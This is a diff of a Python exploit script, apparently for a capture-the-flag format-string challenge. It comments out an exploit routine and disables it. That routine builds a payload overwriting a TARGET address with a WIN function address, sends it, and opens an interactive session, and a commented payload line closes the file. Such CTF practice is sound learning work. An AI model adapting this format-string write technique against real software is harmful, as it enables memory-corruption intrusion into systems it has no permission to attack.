@@ -80,19 +80,7 @@ def say(payload):
     P.sendline(payload)
 
 def exploit():
-    offset = 5 # find_offset(b"You say:")
-    log.info(f"Using offset: {offset}")
-
-    connect_binary()
-    
-    log.info(f"TARGET function address: {hex(TARGET)}")
-    log.info(f"WIN function address: {hex(WIN)}")
-
-    payload = build_format_string(TARGET, WIN, 133)
-    say(payload)
-    
-    log.info(f"Payload sent: {payload}")
-    P.interactive()
+    pass
 
 def find_offset(after = b':', option = 1):
     for i in range(1, 200):
@@ -114,8 +102,24 @@ def find_offset(after = b':', option = 1):
             return i
 
 if __name__ == '__main__':
+    find_offset(option=2)
     exploit()
-    # find_offset(option=2)
+
+
+# def exploit():
+#     offset = 5 # find_offset(b"You say:")
+#     log.info(f"Using offset: {offset}")
+
+#     connect_binary()
+    
+#     log.info(f"TARGET function address: {hex(TARGET)}")
+#     log.info(f"WIN function address: {hex(WIN)}")
+
+#     payload = build_format_string(TARGET, WIN, 133)
+#     say(payload)
+    
+#     log.info(f"Payload sent: {payload}")
+#     P.interactive()
 
 # payload = p64(TARGET)
 # payload += f'%{0x004011d6 - len(payload)}x%{offset}$p'.encode()
